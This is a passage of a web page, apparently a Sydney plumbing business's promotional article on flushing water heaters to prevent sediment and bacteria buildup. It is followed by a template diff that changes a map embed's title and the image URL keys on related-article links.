water supply and health risks</h3><p>Neglecting to flush your water heater can lead to the growth of harmful bacteria in the tank. When bacteria proliferate within the water heater, it contaminates the water supply flowing into your home. This poses serious health risks to you and your family members. Consuming water that has been contaminated by bacteria can result in gastrointestinal issues and other health problems. Therefore, conducting regular maintenance such as Hot Water System Cleaning is imperative to ensure the safety of your drinking water.<br/><br/>Furthermore, the buildup of sediment and minerals in a neglected water heater can also contribute to the contamination of your water supply. Over time, these substances accumulate in the tank and can leach into the water, causing it to become discolored or emit a foul odor. Ingesting water that has been tainted with sediment and minerals can have detrimental effects on one's health. To prevent such issues and maintain a clean water supply, it is essential to schedule routine maintenance tasks like Hot Water System Cleaning to safeguard your health and the wellbeing of your household.</p><h2 id="signs-that-indicate-a-need-for-water-heater-maintenance">Signs that indicate a need for water heater maintenance</h2><p>When your water heater is in need of maintenance, there are some clear signs to look out for. Discolored or foul-smelling water coming out of your taps indicates that your water heater may need attention. This could be a result of sediment buildup or bacteria growth inside the water heater. If you notice any unusual odours or colours in your water, it is essential to consider a professional Hot Water System Cleaning service to address the issue promptly.<br/><br/>Another indicator that your water heater requires maintenance is if it is making strange noises during operation. The sound of cracking, popping, or loud rumbling could suggest that sediment has accumulated at the bottom of the tank. This buildup can reduce the efficiency of your water heater and even lead to long-term damage if not addressed. By scheduling regular maintenance and Hot Water System Cleaning, you can ensure that your water heater operates efficiently and reliably.</p><h3 id="discolored-or-foulsmelling-water">Discolored or foulsmelling water</h3><p>Discolored or foul-smelling water emerging from your taps can be a clear indication of sediment buildup in your water heater. Over time, minerals and debris accumulate at the bottom of the tank, leading to discolored water that ranges from a yellowish tinge to a rusty brown hue. This accumulation not only affects the water's appearance but also contributes to unpleasant odors that can permeate throughout your home.  <br/><br/>If you notice any signs of discolored or foul-smelling water coming from your taps, it may be time to consider a Hot Water System Cleaning. Neglecting regular maintenance and flushing of your water heater can lead to a myriad of issues, including compromised water quality and potentially harmful health risks. By investing in routine maintenance for your water heater, you can ensure that your system functions efficiently and provides clean, safe water for your household.</p><h2 id="importance-of-periodic-flushing-for-water-heater-longevity">Importance of periodic flushing for water heater longevity</h2><p>Regular maintenance of your water heater, including the essential task of periodic flushing, is paramount for ensuring its longevity and optimal performance. Neglecting this crucial maintenance step can lead to a buildup of sediment and minerals within the tank, which can reduce the efficiency of your hot water system and potentially even cause irreversible damage. Hot Water System Cleaning is not just a recommended practice, but a necessary one to prevent issues such as decreased heating efficiency and an increased risk of corrosion within the tank that can compromise its lifespan.<br/><br/>By incorporating routine flushing into your water heater maintenance schedule, you can prevent the buildup of sediment and mineral deposits that can impede the heating process and strain the system over time. This proactive approach not only promotes the longevity of your water heater but also ensures that it continues to function at its best, providing you with a reliable supply of hot water whenever you need it. Remember, neglecting the importance of Hot Water System Cleaning can result in costly repairs or even premature replacement of your water heater, making regular maintenance a wise investment in the longevity and efficiency of your hot water system.</p><h3 id="ensuring-optimal-performance-and-reliability">Ensuring optimal performance and reliability</h3><p>To ensure optimal performance and reliability of your water heater, regular maintenance is essential. Hot water systems cleaning should be scheduled periodically to prevent the buildup of sediment and minerals in the tank. Neglecting this task can lead to decreased efficiency and potential malfunctions in the system. By flushing the water heater regularly, you can help extend its lifespan and maintain its effectiveness in providing hot water for your household needs.<br/>In addition to scheduling routine maintenance, it is important to pay attention to any warning signs that may indicate a need for immediate action. Discolored or foul-smelling water coming from your taps can be a clear indication that your water heater requires attention. By addressing these issues promptly and conducting regular hot water system cleaning, you can ensure that your water heater operates efficiently and reliably, providing you with consistent hot water whenever needed.</p><h2 id="faqs">FAQS</h2><h3 id="why-is-it-important-to-flush-your-water-heater-regularly">Why is it important to flush your water heater regularly?</h3><p>Flushing your water heater regularly helps to remove sediment buildup, prevent bacteria growth, and maintain optimal performance.</p><h3 id="how-often-should-i-flush-my-water-heater">How often should I flush my water heater?</h3><p>It is recommended to flush your water heater at least once a year to ensure it functions efficiently and to extend its lifespan.</p><h3 id="what-are-the-signs-that-indicate-my-water-heater-needs-maintenance">What are the signs that indicate my water heater needs maintenance?</h3><p>Signs that indicate your water heater needs maintenance include discolored or foul-smelling water, fluctuating water temperature, and strange noises coming from the unit.</p><h3 id="can-neglecting-to-flush-my-water-heater-lead-to-health-risks">Can neglecting to flush my water heater lead to health risks?</h3><p>Yes, neglecting to flush your water heater can lead to bacteria growth, which can contaminate your water supply and pose health risks to you and your family.</p><h3 id="how-does-flushing-my-water-heater-contribute-to-its-longevity">How does flushing my water heater contribute to its longevity?</h3><p>Flushing your water heater helps to remove sediment and mineral buildup, which can cause corrosion and reduce the efficiency of the unit, thus contributing to its longevity and reliability.</p>
 </div>
         </div>
     </div>
@@ -303,7 +305,7 @@
         <div class="row bg-section-light rounded g-0 g-md-4">
             <div class="col-12 col-lg-5 align-self-center">
                 <div class="card h-100 border-0 p-0 bg-section-light" style="display: {{is_contact_iframe_url}}">
-                    <iframe
+                    <iframe title="Locate Us"
                             src="https://www.google.com/maps/embed?pb=!1m18!1m12!1m3!1d3311.0481185021067!2d151.03226627667377!3d-33.91416112141155!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m3!1m2!1s0x6b12bdaa28c01eaf%3A0xc5ab587e68ecf3f5!2sHot%20water%20experts%20sydney%20%7C%20Hot%20water%20repair%20%7C%20Emergency%20hot%20water%20repair%20%7C%20Hot%20water%20system%20installation!5e0!3m2!1sen!2sau!4v1720431946895!5m2!1sen!2sau"
                             class="border-0 rounded" height="340" allowfullscreen="" loading="lazy"
                             referrerpolicy="no-referrer-when-downgrade"></iframe>
@@ -344,7 +346,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/hot-water-system-cleaning-326494.jpg?key=cFpDBo" alt="Hot Water System Cleaning" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/hot-water-system-cleaning-326494.jpg?key=8RAErB" alt="Hot Water System Cleaning" class="rounded"
                                  width="80" height="80">
                             <a href="hot-water-system-cleaning.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Hot Water System Cleaning
@@ -356,7 +358,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-i-flush-my-water-heater-myself-1-326587.jpg?key=HRMYwT" alt="Can I flush my water heater myself?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-i-flush-my-water-heater-myself-1-326587.jpg?key=gGJluV" alt="Can I flush my water heater myself?" class="rounded"
                                  width="80" height="80">
                             <a href="can-i-flush-my-water-heater-myself-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Can I flush my water heater myself?
@@ -368,7 +370,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-flush-sediment-out-of-hot-water-lines-326603.jpg?key=QeVhZ2" alt="How do you flush sediment out of hot water lines?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-flush-sediment-out-of-hot-water-lines-326603.jpg?key=v2zgdK" alt="How do you flush sediment out of hot water lines?" class="rounded"
                                  width="80" height="80">
                             <a href="how-do-you-flush-sediment-out-of-hot-water-lines.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How do you flush sediment out of hot water lines?
@@ -380,7 +382,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-i-flush-my-hot-water-system-in-australia-326604.jpg?key=Kcqm5q" alt="How do I flush my hot water system in Australia?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-i-flush-my-hot-water-system-in-australia-326604.jpg?key=9LTDWK" alt="How do I flush my hot water system in Australia?" class="rounded"
                                  width="80" height="80">
                             <a href="how-do-i-flush-my-hot-water-system-in-australia.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How do I flush my hot water system in Australia?
@@ -392,7 +394,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-flush-a-hot-water-heating-system-326605.jpg?key=GLfOCw" alt="How do you flush a hot water heating system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-flush-a-hot-water-heating-system-326605.jpg?key=aSaQ27" alt="How do you flush a hot water heating system?" class="rounded"
                                  width="80" height="80">
                             <a href="how-do-you-flush-a-hot-water-heating-system.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How do you flush a hot water heating system?
@@ -404,7 +406,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/should-i-flush-a-7-year-old-water-heater-326606.jpg?key=WfK8D7" alt="Should I flush a 7 year old water heater?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/should-i-flush-a-7-year-old-water-heater-326606.jpg?key=rVuk3l" alt="Should I flush a 7 year old water heater?" class="rounded"
                                  width="80" height="80">
                             <a href="should-i-flush-a-7-year-old-water-heater.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Should I flush a 7 year old water heater?
@@ -416,7 +418,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-i-know-if-my-water-heater-needs-to-be-flushed-326607.jpg?key=bcpTra" alt="How do I know if my water heater needs to be flushed?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-i-know-if-my-water-heater-needs-to-be-flushed-326607.jpg?key=t345P6" alt="How do I know if my water heater needs to be flushed?" class="rounded"
                                  width="80" height="80">
                             <a href="how-do-i-know-if-my-water-heater-needs-to-be-flushed.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How do I know if my water heater needs to be flushed?
@@ -428,7 +430,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-does-it-cost-to-flush-a-water-heater-1-326608.jpg?key=BCvm8H" alt="What does it cost to flush a water heater?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-does-it-cost-to-flush-a-water-heater-1-326608.jpg?key=0XDRn8" alt="What does it cost to flush a water heater?" class="rounded"
                                  width="80" height="80">
                             <a href="what-does-it-cost-to-flush-a-water-heater-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What does it cost to flush a water heater?
@@ -440,7 +442,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-fix-brown-water-from-a-hot-water-heater-326609.jpg?key=GBSJQL" alt="How do you fix brown water from a hot water heater?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-fix-brown-water-from-a-hot-water-heater-326609.jpg?key=8OmtPi" alt="How do you fix brown water from a hot water heater?" class="rounded"
                                  width="80" height="80">
                             <a href="how-do-you-fix-brown-water-from-a-hot-water-heater.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How do you fix brown water from a hot water heater?
@@ -452,7 +454,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-flush-a-domestic-heating-system-326610.jpg?key=LE5Fhh" alt="How do you flush a domestic heating system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-flush-a-domestic-heating-system-326610.jpg?key=DXnCxy" alt="How do you flush a domestic heating system?" class="rounded"
                                  width="80" height="80">
                             <a href="how-do-you-flush-a-domestic-heating-system.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How do you flush a domestic heating system?
@@ -464,7 +466,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-clean-a-hot-water-system-326611.jpg?key=7zHvWt" alt="How do you clean a hot water system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-clean-a-hot-water-system-326611.jpg?key=0fdycu" alt="How do you clean a hot water system?" class="rounded"
                                  width="80" height="80">
                             <a href="how-do-you-clean-a-hot-water-system.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How do you clean a hot water system?
@@ -476,7 +478,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-i-clear-a-clogged-hot-water-system-326612.jpg?key=azh4Qz" alt="How do I clear a clogged hot water system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-i-clear-a-clogged-hot-water-system-326612.jpg?key=wL7KS7" alt="How do I clear a clogged hot water system?" class="rounded"
                                  width="80" height="80">
                             <a href="how-do-i-clear-a-clogged-hot-water-system.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How do I clear a clogged hot water system?
@@ -488,7 +490,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-i-know-if-my-hot-water-heater-is-full-of-sediment-326613.jpg?key=nRsunX" alt="How do I know if my hot water heater is full of sediment?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-i-know-if-my-hot-water-heater-is-full-of-sediment-326613.jpg?key=4E7hag" alt="How do I know if my hot water heater is full of sediment?" class="rounded"
                                  width="80" height="80">
                             <a href="how-do-i-know-if-my-hot-water-heater-is-full-of-sediment.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How do I know if my hot water heater is full of sediment?
@@ -500,7 +502,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-does-a-plumber-flush-the-lines-326614.jpg?key=O5QoqP" alt="How does a plumber flush the lines?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-does-a-plumber-flush-the-lines-326614.jpg?key=Yo1NgW" alt="How does a plumber flush the lines?" class="rounded"
                                  width="80" height="80">
                             <a href="how-does-a-plumber-flush-the-lines.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How does a plumber flush the lines?
@@ -512,7 +514,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-you-drain-the-sediment-out-of-a-hot-water-heater-326615.jpg?key=vI0wC6" alt="Can you drain the sediment out of a hot water heater?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-you-drain-the-sediment-out-of-a-hot-water-heater-326615.jpg?key=7UFGMz" alt="Can you drain the sediment out of a hot water heater?" class="rounded"
                                  width="80" height="80">
                             <a href="can-you-drain-the-sediment-out-of-a-hot-water-heater.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Can you drain the sediment out of a hot water heater?
@@ -524,7 +526,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-get-hard-water-sediment-out-of-a-hot-water-heater-326616.jpg?key=e8GPeb" alt="How do you get hard water sediment out of a hot water heater?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-do-you-get-hard-water-sediment-out-of-a-hot-water-heater-326616.jpg?key=6luslZ" alt="How do you get hard water sediment out of a hot water heater?" class="rounded"
                                  width="80" height="80">
                             <a href="how-do-you-get-hard-water-sediment-out-of-a-hot-water-heater.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How do you get hard water sediment out of a hot water heater?
@@ -536,7 +538,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-a-hot-water-system-be-serviced-3-326916.jpg?key=VNRlV5" alt="How often should a hot water system be serviced?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-a-hot-water-system-be-serviced-3-326916.jpg?key=SC94wN" alt="How often should a hot water system be serviced?" class="rounded"
                                  width="80" height="80">
                             <a href="how-often-should-a-hot-water-system-be-serviced-3.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How often should a hot water system be serviced?
@@ -548,7 +550,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-a-hot-water-tank-be-serviced-1-326917.jpg?key=B5lShD" alt="How often should a hot water tank be serviced?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-a-hot-water-tank-be-serviced-1-326917.jpg?key=TRxrvl" alt="How often should a hot water tank be serviced?" class="rounded"
                                  width="80" height="80">
                             <a href="how-often-should-a-hot-water-tank-be-serviced-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How often should a hot water tank be serviced?
@@ -560,7 +562,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-to-clean-a-hot-water-system-326918.jpg?key=NI0yJo" alt="How to clean a hot water system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-to-clean-a-hot-water-system-326918.jpg?key=wWD1js" alt="How to clean a hot water system?" class="rounded"
                                  width="80" height="80">
                             <a href="how-to-clean-a-hot-water-system.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How to clean a hot water system?
@@ -572,7 +574,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/should-you-get-your-hot-water-tank-serviced-326919.jpg?key=Kz6osp" alt="Should you get your hot water tank serviced?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/should-you-get-your-hot-water-tank-serviced-326919.jpg?key=TnVlC8" alt="Should you get your hot water tank serviced?" class="rounded"
                                  width="80" height="80">
                             <a href="should-you-get-your-hot-water-tank-serviced.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Should you get your hot water tank serviced?
@@ -584,7 +586,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-average-lifespan-of-a-hot-water-system-4-326920.jpg?key=8NC0hI" alt="What is the average lifespan of a hot water system?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/what-is-the-average-lifespan-of-a-hot-water-system-4-326920.jpg?key=7paD8M" alt="What is the average lifespan of a hot water system?" class="rounded"
                                  width="80" height="80">
                             <a href="what-is-the-average-lifespan-of-a-hot-water-system-4.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 What is the average lifespan of a hot water system?
@@ -596,7 +598,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/should-i-flush-my-10-year-old-water-heater-326921.jpg?key=VbNAIQ" alt="Should I flush my 10 year old water heater?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/should-i-flush-my-10-year-old-water-heater-326921.jpg?key=imbjVU" alt="Should I flush my 10 year old water heater?" class="rounded"
                                  width="80" height="80">
                             <a href="should-i-flush-my-10-year-old-water-heater.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Should I flush my 10 year old water heater?
@@ -608,7 +610,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-it-better-to-flush-or-drain-water-heater-326922.jpg?key=XgXuVr" alt="Is it better to flush or drain water heater?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/is-it-better-to-flush-or-drain-water-heater-326922.jpg?key=oEKS2x" alt="Is it better to flush or drain water heater?" class="rounded"
                                  width="80" height="80">
                             <a href="is-it-better-to-flush-or-drain-water-heater.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Is it better to flush or drain water heater?
@@ -620,7 +622,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/do-hot-water-tanks-need-to-be-cleaned-326924.jpg?key=ZacmBO" alt="Do hot water tanks need to be cleaned?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/do-hot-water-tanks-need-to-be-cleaned-326924.jpg?key=aAj744" alt="Do hot water tanks need to be cleaned?" class="rounded"
                                  width="80" height="80">
                             <a href="do-hot-water-tanks-need-to-be-cleaned.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Do hot water tanks need to be cleaned?
@@ -632,7 +634,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-a-hot-water-tank-last-20-years-2-326925.jpg?key=1dcM5c" alt="Can a hot water tank last 20 years?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/can-a-hot-water-tank-last-20-years-2-326925.jpg?key=sKc8TO" alt="Can a hot water tank last 20 years?" class="rounded"
                                  width="80" height="80">
                             <a href="can-a-hot-water-tank-last-20-years-2.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Can a hot water tank last 20 years?
@@ -644,7 +646,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-hot-water-tanks-be-cleaned-326927.jpg?key=HFXzdb" alt="How often should hot water tanks be cleaned?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-hot-water-tanks-be-cleaned-326927.jpg?key=yvNWG3" alt="How often should hot water tanks be cleaned?" class="rounded"
                                  width="80" height="80">
                             <a href="how-often-should-hot-water-tanks-be-cleaned.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 How often should hot water tanks be cleaned?
@@ -656,7 +658,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/should-i-flush-my-water-heater-every-year-1-326928.jpg?key=IgXLj1" alt="Should I flush my water heater every year?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/should-i-flush-my-water-heater-every-year-1-326928.jpg?key=4dlay6" alt="Should I flush my water heater every year?" class="rounded"
                                  width="80" height="80">
                             <a href="should-i-flush-my-water-heater-every-year-1.html" class="h5 card-title mb-0 fw-semibold text-capitalize text-decoration-none stretched-link align-self-center">
                                 Should I flush my water heater every year?
@@ -668,7 +670,7 @@
                 <div class="card h-100 bg-section-dark">
                     <div class="card-body p-2 position-relative">
                         <div class="hstack gap-3 align-items-center">
-                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-i-replace-my-anode-rod-2-326929.jpg?key=2O3edW" alt="How often should I replace my anode rod?" class="rounded"
+                            <img src="https://pub-817e745bae054e7a9d65afbddbf23489.r2.dev/Hot-Water-Experts-Sy-2421_NjE0Ng==/how-often-should-i-replace-my-anode-rod-2-326929.jpg?key=GC6cMd" alt="How often should I replace my anode rod?" class="rounded"
                                  width="80" height="80">
